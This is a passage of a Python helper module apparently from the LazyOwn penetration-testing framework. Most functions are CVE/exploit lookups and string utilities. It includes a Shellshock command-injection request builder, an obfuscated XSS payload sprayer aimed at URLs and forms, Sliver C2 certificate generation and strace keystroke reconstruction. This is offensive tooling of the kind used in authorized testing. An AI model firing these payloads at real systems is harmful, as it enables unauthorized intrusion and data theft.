    random_b = random.randint(0, 255)    
    prompt = f"""{YELLOW}┌─{YELLOW}[{TRUE_COLOR.format(random_r, random_g, random_b)}LazyOwn{WHITE}👽{CYAN}{ip}{BRIGHT_CYAN}/{BRIGHT_MAGENTA}{hostname}{YELLOW}]{COLOR_256.format(random_color)}
    {YELLOW}└╼ {BLINK}{BRIGHT_GREEN}{prompt_char}{RESET} """.replace('    ','')

    return prompt

def copy2clip(text):
    """
    Copia el texto proporcionado al portapapeles usando xclip.

    Args:
        text (str): El texto que se desea copiar al portapapeles.

    Example:
        copy2clip("Hello, World!")
    """
    try:
        subprocess.run(['xclip', '-selection', 'clipboard'], input=text.encode(), check=True)
        print_msg(f"Text copied to clipboard. {text}")
        return text
    except subprocess.CalledProcessError as e:
        print_error(f"Error to copy to clip: {e}")
    except FileNotFoundError:
        print_error("xclip not found `sudo apt-get install xclip`.")

def clean_output(output):
    """Elimina secuencias de escape de color y otros caracteres no imprimibles."""

    output = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', output)
    output = re.sub(r'(\x07|\x08|\x0A|\x0D|\x1B|\x7F|\x9B|\033\\|\033\\|\033\[|\033\]|\033\[[\d;]*[a-zA-Z])', '', output)
    output = re.sub(r'\\(?:33\[K|10|7)', '', output)
    output = re.sub(r' +', ' ', output)
    output = '\n'.join(line.strip() for line in output.split('\n') if line.strip())
    return output



def teclado_usuario(filename):
    """
    Procesa un archivo para extraer y mostrar caracteres desde secuencias de escritura específicas.

    Args:
        filename (str): El nombre del archivo a leer.

    Raises:
        FileNotFoundError: Si el archivo no se encuentra.
        Exception: Para otros errores que puedan ocurrir.
    """
    try:
        with open(filename, 'r') as file:
            content = file.readlines()

        output = ""
        for line in content:
            if line.startswith('write(5,'):
                match = re.search(r'write\(5, "(.*?)"', line)
                if match:
                    char = match.group(1)
                    if char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -.':
                        output += char
                    elif char == '\\n':
                        print(output)
                        output = ""

        if output:  # Imprimir cualquier salida restante
            print(output)

    except FileNotFoundError:
        print(f"Archivo {filename} no encontrado.")
    except Exception as e:
        print(f"Error: {e}")



def salida_strace(filename):
    """
    Lee un archivo, extrae texto desde secuencias de escritura y muestra el contenido reconstruido.

    Args:
        filename (str): El nombre del archivo a leer.

    Raises:
        FileNotFoundError: Si el archivo no se encuentra.
        Exception: Para otros errores que puedan ocurrir.
    """    
    try:
        with open(filename, 'r') as file:
            content = file.readlines()

        output = ""
        for line in content:
            if line.startswith('write(5,'):
                match = re.search(r'write\(5, "(.*?)"', line)
                if match:
                    text = match.group(1)
                    if len(text) > 1:  # Solo considerar textos con más de un carácter
                        output += text

        if output:
            print("Contenido reconstruido:")
            print(output)
            print("Contenido despues de limpieza")
            print(clean_output(output))

    except FileNotFoundError:
        print(f"Archivo {filename} no encontrado.")
    except Exception as e:
        print(f"Error: {e}")

    
def exploitalert(content):
    """
    Process and display results from ExploitAlert.

    This function checks if the provided content contains any results. 
    If results are present, it prints the title and link for each exploit found, 
    and appends the results to a predata list. If no results are found, 
    it prints an error message.

    Parameters:
    - content (list): A list of dictionaries containing exploit information.

    Returns:
    None
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    try:
        if len(content) != 0:
            
            print_msg(f"|{GREEN}+ ExploitAlert Result {WHITE}")
            print_msg("|------------------------")


            predata = []
            for data in content:
                print_msg(f"|{BLUE}-{WHITE} Title : {data['name']}")
                print_msg(f"|{BLUE}-{WHITE} Link : https://www.exploitalert.com/view-details.html?id={data['id']}")
                


                predata.append({
                    "title" : data['name'],
                    "link" : f"https://www.exploitalert.com/view-details.html?id={data['id']}"
                })
            print_msg(f"|{BLUE}-{WHITE} Total Result : {GREEN}{len(content)}{WHITE} Exploits Found!")
            data.append({"exploitalert" : predata})
        else:
            print_error(f"|{RED}- No result in ExploitAlert!{WHITE}")
    except:
        print_error(f"|{RED}- Internal Error - No result in ExploitAlert!{WHITE}")
    return

def packetstormsecurity(content):
    """
    Process and display results from PacketStorm Security.

    This function extracts exploit data from the provided content using regex. 
    If any results are found, it prints the title and link for each exploit, 
    and appends the results to a predata list. If no results are found, 
    it prints an error message.

    Parameters:
    - content (str): The HTML content from PacketStorm Security.

    Returns:
    None
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    try:
        reg = re.findall('<dt><a class="ico text-plain" href="(.*?)" title="(.*?)">(.*?)</a></dt>', content)
        if len(reg) != 0:
            
            print_msg(f"|{GREEN}+ PacketStorm Result {WHITE}")
            print_msg("|-----------------------")

            predata = []
            for data in reg:
                print_msg(f"|{BLUE}-{WHITE} Title : {data[2]}")
                print_msg(f"|{BLUE}-{WHITE} Link : https://packetstormsecurity.com{data[0]}")
            

                predata.append({
                    "title" : data[2],
                    "link" : f"https://packetstormsecurity.com{data[0]}"
                })
            print_msg(f"|{BLUE}-{WHITE} Total Result : {GREEN}{len(reg)}{WHITE} Exploits Found!")
            data.append({"packetstormsecurity" : predata})
        else:
            print_error(f"|{RED}- No result in PacketStorm!{WHITE}")
    except:
        print_error(f"|{RED}- Internal Error - No result in PacketStorm!{WHITE}")
    return

def nvddb(content):
    """
    Process and display results from the National Vulnerability Database.

    This function checks if there are any vulnerabilities in the provided content. 
    If vulnerabilities are present, it prints the ID, description, and link 
    for each CVE found, and appends the results to a predata list. 
    If no results are found, it prints an error message.

    Parameters:
    - content (dict): A dictionary containing vulnerability data.

    Returns:
    None
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """
    try:
        if len(content['vulnerabilities']) != 0:
            print_msg(f"{GREEN}|-----------------------------------------------")
            print_msg(f"{GREEN}|+ National Vulnearbility Database Result       +{WHITE}")
            print_msg(f"{GREEN}|-----------------------------------------------")

            predata = []
            for data in content['vulnerabilities']:
                print_msg(f"{BLUE}-{BG_YELLOW}{RED} ID : {data['cve']['id']}")
                print_msg(f"{BLUE}-{BG_BLACK}{WHITE} Description : {data['cve']['descriptions'][0]['value']}")
                print_msg(f"{BLUE}-{BG_BLACK}{BLUE} Link : https://nvd.nist.gov/vuln/detail/{data['cve']['id']}")

                predata.append({
                    "title" : data['cve']['id'],
                    "description" : data['cve']['descriptions'][0]['value'],
                    "link" : f"https://nvd.nist.gov/vuln/detail/{data['cve']['id']}"
                })
            print_msg(f"|{BLUE}-{RED} Total Result : {GREEN}{len(content)}{YELLOW} CVEs Found!")
            data.append({"nvddb" : predata})
        else:
            print_error("|")
            print_error(f"|{RED}- No result in National Vulnearbility Database!{WHITE}")
    except:
        print_error(f"|{RED}- Internal Error - No result in National Vulnearbility Database!{WHITE}")
    return

def find_ss(keyword = ""):
    """
    Find CVEs in the National Vulnerability Database based on a keyword.

    This function takes a keyword, formats it for the API request, 
    and sends a GET request to the NVD API. If the request is successful, 
    it returns the JSON response containing CVE data; otherwise, 
    it returns False.

    Parameters:
    - keyword (str): The keyword to search for in CVEs.

    Returns:
    - dict or bool: The JSON response containing CVE data or False on failure.
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    keyword = f"{keyword}"
    keyword = keyword.replace(" ", "%20")
    resp = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword}")
    if resp.status_code == 200:
        return resp.json()
    else:
        return False

def find_ea(keyword=""):
    """
    Find exploits in ExploitAlert based on a keyword.

    This function takes a keyword, formats it for the API request, 
    and sends a GET request to the ExploitAlert API. If the request is successful, 
    it returns the JSON response containing exploit data; otherwise, 
    it returns False.

    Parameters:
    - keyword (str): The keyword to search for exploits.

    Returns:
    - dict or bool: The JSON response containing exploit data or False on failure.
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    keyword = f"{keyword}"
    try:
        resp = requests.get(f"https://www.exploitalert.com/api/search-exploit?name={keyword}")
        if resp.status_code == 200:
            return resp.json()
        else:
            return False
    except:
        return False

def find_ps(keyword=""):
    """
    Find exploits in PacketStorm Security based on a keyword.

    This function takes a keyword, formats it for the search request, 
    and sends a GET request to the PacketStorm Security website. 
    If the request is successful, it returns the HTML response; otherwise, 
    it returns False.

    Parameters:
    - keyword (str): The keyword to search for exploits.

    Returns:
    - str or bool: The HTML response containing exploit data or False on failure.
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    keyword = f"{keyword}"
    resp = requests.get(f"https://packetstormsecurity.com/search/?q={keyword}")
    if resp.status_code == 200:
        return resp.text
    else:
        return False

def xor_encrypt_decrypt(data, key):
    """
    Encrypts or decrypts data using XOR encryption with the provided key.

    Parameters:
    data (bytes or bytearray): The input data to be encrypted or decrypted.
    key (str): The encryption key as a string.

    Returns:
    bytearray: The result of the XOR operation, which can be either the encrypted or decrypted data.

    Example:
    encrypted_data = xor_encrypt_decrypt(b"Hello, World!", "key")
    decrypted_data = xor_encrypt_decrypt(encrypted_data, "key")
    print(decrypted_data.decode("utf-8"))  # Outputs: Hello, World!

    Additional Notes:
    - XOR encryption is symmetric, meaning that the same function is used for both encryption and decryption.
    - The key is repeated cyclically to match the length of the data if necessary.
    - This method is commonly used for simple encryption tasks, but it is not secure for protecting sensitive information.
    """
    key_bytes = bytes(key, "utf-8")
    key_length = len(key_bytes)
    return bytearray([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])

def run(command):
    """
    Executes a shell command using the subprocess module, capturing its output.

    Parameters:
    command (str): The command to execute.

    Returns:
    str: The output of the command if successful, or an error message if an exception occurs.

    Exceptions:
    - FileNotFoundError: Raised if the command is not found.
    - subprocess.CalledProcessError: Raised if the command exits with a non-zero status.
    - subprocess.TimeoutExpired: Raised if the command times out.
    - Exception: Catches any other unexpected exceptions.

    Example:
    output = run("ls -la")
    print(output)

    Additional Notes:
    The function attempts to execute the provided command, capturing its output.
    It also handles common exceptions that may occur during command execution.
    """
    try:
        print_msg(f"Attempting to execute: {command}")
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        print_msg(result)
        return result.stdout.strip()
    except FileNotFoundError as fnf_error:
        print_error(f"Command not found: {command}")
        return str(fnf_error)
    except subprocess.CalledProcessError as cpe_error:
        print_error(f"Command failed with exit code {cpe_error.returncode}: {command}")
        return str(cpe_error)
    except subprocess.TimeoutExpired as te_error:
        print_error(f"Command timed out: {command}")
        return str(te_error)
    except Exception as e:
        print_error(f"An unexpected error occurred: {str(e)}")
        return str(e)

def is_exist(file):
    """Check if a file exists.

    This function checks whether a given file exists on the filesystem. If the file 
    does not exist, it prints an error message and returns False. Otherwise, it returns True.

    Arguments:
    file (str): The path to the file that needs to be checked.

    Returns:
    bool: Returns True if the file exists, False otherwise.

    Example:
    >>> is_exist('/path/to/file.txt')
    True
    >>> is_exist('/non/existent/file.txt')
    False

    Notes:
    This function uses os.path.isfile to determine the existence of the file. 
    Ensure that the provided path is correct and accessible.
    """

    if not os.path.isfile(file):
        print_error(f"Fatal error: {file} is missing")
        return False
    return True

def get_domain(url):
    """
    Extracts the domain from a given URL.

    Parameters:
    url (str): The full URL from which to extract the domain.

    Returns:
    str: The extracted domain from the URL, or None if it cannot be extracted.
    """
    pattern = r'^(?:https?://)?(?:www\.)?([^/]+)'
    match = re.search(pattern, url)
    if match:
        return match.group(1)
    return None

def generate_certificates():
    """
    Generates a certificate authority (CA), client certificate, and client key.
    
    Returns:
        str: Paths to the generated CA certificate, client certificate, and client key.
    """
    # Create a temporary directory for the certificates
    with tempfile.TemporaryDirectory() as temp_dir:
        ca_cert_path = os.path.join(temp_dir, "ca_cert.pem")
        client_cert_path = os.path.join(temp_dir, "client_cert.pem")
        client_key_path = os.path.join(temp_dir, "client_key.pem")

        # Generate the CA certificate
        print_msg("Generating CA certificate...")
        subprocess.run([
            "sudo", "openssl", "req", "-x509", "-new", "-nodes", "-keyout", "ca_key.pem",
            "-out", ca_cert_path, "-days", "365", "-subj", "/CN=SliverCA"
        ], check=True)

        # Generate the client key
        print_msg("Generating client key...")
        subprocess.run([
            "sudo", "openssl", "genrsa", "-out", client_key_path, "2048"
        ], check=True)

        # Generate the client certificate signing request (CSR)
        print_msg("Generating client CSR...")
        subprocess.run([
            "sudo", "openssl", "req", "-new", "-key", client_key_path, "-out", "client_csr.pem",
            "-subj", "/CN=SliverClient"
        ], check=True)

        # Sign the client CSR with the CA key to create the client certificate
        print_msg("Generating client certificate...")
        subprocess.run([
            "sudo", "openssl", "x509", "-req", "-in", "client_csr.pem", "-CA", ca_cert_path,
            "-CAkey", "ca_key.pem", "-CAcreateserial", "-out", client_cert_path,
            "-days", "365"
        ], check=True)

        return ca_cert_path, client_cert_path, client_key_path

def generate_emails(full_name, domain):
    """
    Generate email permutations based on the provided full name and domain.

    This function takes a full name and domain as input, splits the full name into
    components, and creates a list of potential email addresses.

    Parameters:
    full_name (str): The full name to base the email addresses on.
    domain (str): The domain to use for the generated email addresses.

    Internal Variables:
    names (list): A list of the name components extracted from the full name.
    first_name (str): The first name component.
    last_name (str): The last name component.
    first_initial (str): The first initial of the first name.
    last_initial (str): The first initial of the last name.

    Returns:
    list: A list of generated email permutations.

    Note:
    - At least two parts of the name are required to generate valid email addresses.
    """
    names = full_name.lower().split()
    
    # Ensure the name has at least two parts
    if len(names) < 2:
        print("Please provide a full name with at least two parts (e.g., 'John Doe').")
        return []

    first_name = names[0]
    last_name = names[-1]
    first_initial = first_name[0]
    last_initial = last_name[0]

    # Define email permutations
    permutations = [
        f"{first_name}@{domain}",
        f"{last_name}@{domain}",
        f"{first_name}.{last_name}@{domain}",
        f"{first_initial}{last_name}@{domain}",
        f"{first_initial}.{last_name}@{domain}",
        f"{first_name}{last_initial}@{domain}",
        f"{first_name}.{last_initial}@{domain}",
        f"{first_initial}{last_initial}@{domain}",
        f"{first_initial}.{last_initial}@{domain}",
        f"{last_name}{first_name}@{domain}",
        f"{last_name}.{first_name}@{domain}",
        f"{last_name}{first_initial}@{domain}",
        f"{last_name}.{first_initial}@{domain}",
        f"{last_initial}{first_name}@{domain}",
        f"{last_initial}.{first_name}@{domain}",
        f"{last_initial}{first_initial}@{domain}",
        f"{last_initial}.{first_initial}@{domain}"
    ]
    
    return permutations
def clean_url(host):
    """Verifica si el último carácter es una barra y, de ser así, la elimina"""
    if host.endswith('/'):
        host = host.rstrip('/')
    return host
    
def random_string(length=15):
    """Generates a random alphanumeric string."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def generate_http_req(host, port, uri, custom_header=None, cmd=None):
    """Generates an HTTP request with the Shellshock payload."""
    if cmd:
        payload = f'() {{ :;}}; echo; /bin/bash -c "{cmd}"'
    else:
        random_string = random_string()
        payload = f'() {{ :;}}; echo; echo "{random_string}"'

    headers = {}
    if custom_header is None:
        headers = {
            'User-Agent': payload,
            'Referer': payload,
            'Cookie': payload
        }
    else:
        headers[custom_header] = payload
    
    url = f"{host}:{port}{uri}"
    print_msg(f"{headers=}")
    response = requests.get(url, headers=headers)

    if cmd:
        return response, None
    else:
        return response, random_string

def format_openssh_key(raw_key):
    """
    Formats a raw OpenSSH private key string to the correct OpenSSH format.

    This function takes a raw OpenSSH private key string, cleans it by removing any unnecessary 
    characters (such as newlines, spaces, and headers/footers), splits the key content into lines 
    of 64 characters, and then reassembles the key with the standard OpenSSH header and footer. 
    It ensures the key follows the correct OpenSSH format.

    Parameters:
        raw_key (str): The raw OpenSSH private key string to format.

    Returns:
        str: The formatted OpenSSH private key with proper headers, footers, and 64-character lines.
    """    
    # Todos los derechos son de 4xura: muchas gracias por esta pieza de software :D https://github.com/4xura/ssh_key_formatter/blob/main/ssh_key_formatter.py
    # Define the header and footer for the OpenSSH key format
    header = "-----BEGIN OPENSSH PRIVATE KEY-----"
    footer = "-----END OPENSSH PRIVATE KEY-----"
    
    # Clean input: Remove any newlines, spaces, and header/footer
    key_content = raw_key.replace(header, "").replace(footer, "").replace("\n", "").replace(" ", "").strip()
    
    # Split into 64-character lines
    formatted_key_content = "\n".join([key_content[i:i+64] for i in range(0, len(key_content), 64)])
    
    # Reassemble the key with the header and footer, and add necessary line breaks
    formatted_key = f"{header}\n{formatted_key_content}\n{footer}\n"
    
    return formatted_key

def format_rsa_key(raw_key):
    """
    Formats a raw RSA private key string to the correct PEM format.

    This function takes a raw RSA private key string, cleans it by removing any unnecessary
    characters (such as newlines, spaces, and headers/footers), splits the key content into lines 
    of 64 characters, and then reassembles the key with the standard PEM header and footer. 
    It ensures the key follows the correct RSA format.

    Parameters:
        raw_key (str): The raw RSA private key string to format.

    Returns:
        str: The formatted RSA private key with proper headers, footers, and 64-character lines.
    """    
    # Define the header and footer for the RSA key format
    header = "-----BEGIN RSA PRIVATE KEY-----"
    footer = "-----END RSA PRIVATE KEY-----"
    
    # Clean input: Remove any newlines, spaces, and header/footer
    key_content = raw_key.replace(header, "").replace(footer, "").replace("\n", "").replace(" ", "").strip()
    
    # Split into 64-character lines
    formatted_key_content = "\n".join([key_content[i:i+64] for i in range(0, len(key_content), 64)])
    
    # Reassemble the key with the header and footer, and add necessary line breaks
    formatted_key = f"{header}\n{formatted_key_content}\n{footer}\n"
    
    return formatted_key

def is_package_installed(package_name):
    """
    Check if a Python package is installed.

    :param package_name: Name of the package to check.
    :returns: True if installed, False otherwise.
    """
    
    return importlib.util.find_spec(package_name) is not None

def extract(string, extract_flag):
    """
    Extracts and processes specific hexadecimal sequences from a string based on a flag.

    If the `extract_flag` is set to True, the function extracts all sequences of the form 'x[a-f0-9][a-f0-9]' 
    (where 'x' is followed by two hexadecimal digits), removes the 'x' from the extracted sequences, 
    and returns the processed string. If `extract_flag` is False, the function returns the original string.

    Parameters:
        string (str): The input string from which hexadecimal sequences are to be extracted.
        extract_flag (bool): A flag indicating whether to perform the extraction (True) or not (False).

    Returns:
        str: The processed string with the extracted hexadecimal sequences if `extract_flag` is True, 
             or the original string if `extract_flag` is False.
    """    
    if extract_flag:
        string = "".join(re.findall(r"x[a-f0-9][a-f0-9]", string))  
        string = string.replace("x", "")  
        return string
    else:
        return string  

def clean_html(html_string):
    """
    Remove HTML tags from a string.

    This function uses a regular expression to strip HTML tags and return plain text.

    :param html_string: A string containing HTML content.
    :returns: A cleaned string with HTML tags removed.
    """
    clean_pattern = re.compile(r'<.*?>')
    cleaned_string = re.sub(clean_pattern, '', html_string)
    return cleaned_string.strip()

def run_command(command):
    """
    Run a command, print output in real-time, and store the output in a variable.

    This method executes a given command using `subprocess.Popen`, streams both the standard 
    output and standard error to the console in real-time, and stores the full output (stdout 
    and stderr) in a variable. If interrupted, the process is terminated gracefully.

    :param command: The command to be executed as a string.
    :type command: str

    :returns: The full output of the command (stdout and stderr).
    :rtype: str

    Example:
        To execute a command, call `run_command("ls -l")`.
    """

    output = ""  
    command_tokens = shlex.split(command)
    try:
        process = subprocess.Popen(
            command_tokens, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        while True:
            stdout_line = process.stdout.readline()
            if stdout_line:
                sys.stdout.write(stdout_line)  
                output += stdout_line  
            stderr_line = process.stderr.readline()
            if stderr_line:
                sys.stdout.write(stderr_line)  
                output += stderr_line  
            if not stdout_line and not stderr_line and process.poll() is not None:
                break
        stdout, stderr = process.communicate()
        if stdout:
            sys.stdout.write(stdout)
            output += stdout
        if stderr:
            sys.stdout.write(stderr)
            output += stderr
    except KeyboardInterrupt:
        process.terminate()
        print_warn("\n[Interrupted] Process terminated")
        process.wait()
    return output  

def generate_random_cve_id():
    """
    Generates a random CVE (Common Vulnerabilities and Exposures) ID.

    This function creates a random CVE ID by selecting a random year between 2020 and 2024,
    and a random code between 1000 and 9999. The CVE ID is returned in the format 'CVE-{year}-{code}'.

    Returns:
        str: A randomly generated CVE ID in the format 'CVE-{year}-{code}'.
    """    
    year = random.randint(2020, 2024)
    code = random.randint(1000, 9999)
    return f"CVE-{year}-{code}"


def get_credentials(file=None, ncred=None):
    """
    Searches for credential files with the pattern 'credentials*.txt' and allows the user to select one.

    The function lists all matching files and prompts the user to select one. It then reads the selected file
    and returns a list of tuples with the format (username, password) for each line in the file.

    Parameters:
    ncred (int, optional): If provided, automatically selects the credential file with the given number.

    Returns:
    list of tuples: A list containing tuples with (username, password) for each credential found in the file.
                    If no files are found or an invalid selection is made, an empty list is returned.
    """
    path = os.getcwd()
    credential_files = glob.glob(f"{path}/sessions/credentials*.txt")

    if not credential_files:
        print_error(f"No credential files found ({credential_files}). Please create one using: createcredentials admin:admin")
        return []

    if ncred is not None:
        if 1 <= ncred <= len(credential_files):
            selected_file = credential_files[ncred - 1]
        else:
            print_error(f"Invalid ncred value: {ncred}. It should be between 1 and {len(credential_files)}.")
            return []
    else:
        print_msg("The following credential files were found:")
        for idx, cred_file in enumerate(credential_files, 1):
            print_msg(f"{idx}. {cred_file}")
        if idx == 1:
            selected_file = credential_files[idx - 1]
        else:
            try:
                file_choice = int(input("    [!] Select the credential file to use (enter the number): "))
                selected_file = credential_files[file_choice - 1]
            except (ValueError, IndexError):
                print_error("Invalid selection.")
                return []

    if file == True:
        return selected_file

    credentials = []
    with open(selected_file, "r") as file:
        for line in file:
            params = line.strip().split(":", 1)
            if len(params) == 2:
                credentials.append((params[0], params[1]))

    return credentials

def load_payload():
    with open('payload.json', 'r') as file:
        config = json.load(file)
    return config

def obfuscate_payload(payload):
    """
    Obfuscates a payload string by converting its characters into hexadecimal format, 
    with additional comments for every third character.

    For every character in the payload, the function converts it to its hexadecimal representation.
    Every third character (after the first) is enclosed in a comment `/*hex_value*/`, while the rest 
    are prefixed with `\\x`.

    Parameters:
        payload (str): The input string that needs to be obfuscated.

    Returns:
        str: The obfuscated string where characters are replaced by their hexadecimal representations, 
             with every third character wrapped in a comment.
    """    
    obfuscated = ""
    for i, c in enumerate(payload):
        if i > 0 and i % 3 == 0:
            obfuscated += f"/*{hex(ord(c))}*/"
        else:
            obfuscated += f"\\x{hex(ord(c))[2:]}"
    return obfuscated

def read_payloads(file_path):
    """
    Reads a file containing payloads and returns a list of properly formatted strings.

    This function opens a specified file, reads each line, and checks if the line starts with a 
    double quote. If it does not, it adds double quotes around the line. Each line is stripped 
    of leading and trailing whitespace before being added to the list.

    Parameters:
        file_path (str): The path to the file containing payloads.

    Returns:
        list: A list of strings, each representing a payload from the file, formatted with 
              leading and trailing double quotes if necessary.
    """    
    with open(file_path, 'r') as file:
        lines = file.readlines()

    payloads = [line.strip() if line.startswith('"') else f'"{line.strip()}"' for line in lines]
    return payloads

def inject_payloads(urls, payload_url, request_timeout=15):
    """
    Sends HTTP requests to a list of URLs with injected payloads for testing XSS vulnerabilities.

    This function reads payloads from a specified file and sends GET requests to the provided URLs,
    injecting obfuscated payloads into the query parameters or form fields to test for cross-site 
    scripting (XSS) vulnerabilities. It handles both URLs with existing query parameters and those 
    without. If forms are found in the response, it submits them with the payloads as well.

    Parameters:
        urls (list): A list of URLs to test for XSS vulnerabilities.
        payload_url (str): A placeholder string within the payloads that will be replaced with 
                           the actual URL for testing.
        request_timeout (int, optional): The timeout for each request in seconds. Defaults to 15.

    Returns:
        None: This function does not return any value but prints the status of each request and 
              form submission to the console.

    Raises:
        requests.RequestException: Raises an exception if any HTTP request fails, which is handled
                                   by printing a warning message.
    """    
    payloads = read_payloads('modules/XssPayloads.txt')
    
    def send_request(raw_url):
        try:
            if not raw_url.startswith(('http://', 'https://')):
                raw_url = 'http://' + raw_url
            parsed_url = urllib.parse.urlparse(raw_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)

            if not query_params:
                for payload in payloads:
                    obfuscated_payload = obfuscate_payload(payload.format(payload_url))
                    full_url = f"{raw_url}?xss={obfuscated_payload}"
                    print_msg(f"[INFO] Sending request to {full_url}")
                    resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
                    resp.raise_for_status()
                    handle_forms(resp.content, full_url)
                return
            
            for key in query_params:
                for payload in payloads:
                    obfuscated_payload = obfuscate_payload(payload.format(payload_url))
                    query_params[key] = obfuscated_payload
                    query_string = urllib.parse.urlencode(query_params, doseq=True)
                    full_url = f"{raw_url}{query_string}&xss={obfuscated_payload}"
                    print_msg(f"[INFO] Sending request to {full_url}")
                    resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
                    resp.raise_for_status()
                    handle_forms(resp.content, full_url)

            updated_query = urllib.parse.urlencode(query_params, doseq=True)
            full_url = parsed_url._replace(query=updated_query).geturl()
            print_msg(f"[INFO] Sending request to {full_url}")
            resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
            resp.raise_for_status()
            handle_forms(resp.content, full_url)
        except requests.RequestException as e:
            print_warn(f"[WARN] Request failed for {raw_url}: {e}")

    def handle_forms(content, url):
        soup = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form')

        if not forms:
            print_msg("[INFO] No forms found.")
            return

        for form in forms:
            action = form.get('action', url)
            if action.startswith('/'):
                action = urllib.parse.urljoin(url, action)

            method = form.get('method', 'GET').upper()
            form_data = {input.get('name'): payloads[0].format(payload_url) for input in form.find_all('input') if input.get('name')}
            if not form_data:
                print_warn("[WARN] No input fields found in form.")
                continue
            urls_str = ''.join(urls)
            action = f"http://{urls_str}/{action}"
            try:
                if method == 'POST':
                    resp = requests.post(action, data=form_data, headers={'User-Agent': 'Mozilla/5.0'})
                else:
                    resp = requests.get(action, params=form_data, headers={'User-Agent': 'Mozilla/5.0'})

                print_msg(f"[INFO] Form submission response from {action}: {resp.status_code}")
            except requests.RequestException as e:
                print_error(f"[ERROR] Failed to submit form at {action}: {e}")

    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(send_request, urls)

def prompt(label, default=None):
    """
    Return the prompt in the function do_xss
    """
    value = input(f"    {GREEN}{label}: ").strip()
    return value if value else default

def is_lower(char):
    """
    Checks if a character is lowercase.

    Parameters:
        char (str): The character to check.
    
    Returns:
        bool: True if the character is lowercase, False otherwise.
    """
    return char.islower()


def is_upper(char):
    """
    Checks if a character is uppercase.

    Parameters:
        char (str): The character to check.
    
    Returns:
        bool: True if the character is uppercase, False otherwise.
    """
    return char.isupper()


def is_mixed(s):
    """
    Determines if a string contains both lowercase and uppercase characters.

    Parameters:
        s (str): The string to check.
    
    Returns:
        bool: True if the string has mixed casing, False otherwise.
    """
    return any(c.islower() for c in s) and any(c.isupper() for c in s)


def add(str_part, delimiter, i):
    """
    Adds a delimiter between string parts if it's not the first part.

    Parameters:
        str_part (str): The string part to add.
        delimiter (str): The delimiter to insert between parts.
        i (int): The index of the part.

    Returns:
        str: The string part with delimiter if applicable.
    """
    if i == 0:
        return str_part
    return delimiter + str_part


def detect_delimiter(foo_bar):
    """
    Detects the delimiter used in the input string (e.g., "-", "_", ".").

    Parameters:
        foo_bar (str): The input string.
    
    Returns:
        str: The detected delimiter.
    """
    if "-" in foo_bar:
        return "-"
    elif "_" in foo_bar:
        return "_"
    elif "." in foo_bar:
        return "."
    return ""


def transform(parts, delimiter, casing):
    """
    Transforms a list of string parts based on the chosen casing style.

    Parameters:
        parts (list): List of string parts.
        delimiter (str): Delimiter to use between parts.
        casing (str): Casing style ('l', 'u', 'c', 'p').

    Returns:
        str: The transformed string.
    """
    result = ""
    
    for i, part in enumerate(parts):
        if casing == "l":
            result += add(part.lower(), delimiter, i)
        elif casing == "u":
            result += add(part.upper(), delimiter, i)
        elif casing == "c":
            if i == 0:
                result += add(part.lower(), delimiter, i)
            else:
                result += add(part.capitalize(), delimiter, i)
        elif casing == "p":
            result += add(part.capitalize(), delimiter, i)

    return result


def handle(input_str):
    """
    Splits the input string into parts based on delimiters or mixed casing.

    Parameters:
        input_str (str): The input string to split.

    Returns:
        list: A list of string parts.
    """
    parts = []

    if "-" in input_str:
        parts = input_str.split("-")
    elif "_" in input_str:
        parts = input_str.split("_")
    elif "." in input_str:
        parts = input_str.split(".")
    else:
        temp = ""
        for char in input_str:
            if char.isupper() and temp:
                parts.append(temp)
                temp = ""
            temp += char
        parts.append(temp)

    return parts

def get_users_dic(txt = None):
    """
    List all .txt files in the 'sessions/' directory and prompt the user to select one by number.
    
    :returns: The path of the selected .txt file.
    """
    path = os.path.join(os.getcwd(), 'sessions')
    
    if txt:
        txt_files = [f for f in os.listdir(path) if f.endswith(f'.{txt}')]
    else:
        txt = "txt"
        txt_files = [f for f in os.listdir(path) if f.endswith('.txt')]
    
    if not txt_files:
        print_error(f"No .{txt} files found in 'sessions/' directory.")
        return None

    print_msg(f"Available .{txt} files:")
    for i, file in enumerate(txt_files):
        print_msg(f"    {i + 1}. {file}")
    
    
    try:
        choice = int(input(f"    [!] Choose a file by number (1-{len(txt_files)}): ").strip())
        if 1 <= choice <= len(txt_files):
            selected_file = txt_files[choice - 1]
            return os.path.join(path, selected_file)
        else:
            print_warn("Invalid selection. Please choose a valid number.")
            return None
    except ValueError:
        print_warn("Invalid input. Please enter a number.")
        return None

def get_hash(dir = None):
    """
    Searches for hash files with the pattern 'hash*.txt' and allows the user to select one.
    
    The function lists all matching files and prompts the user to select one. It then reads the selected file
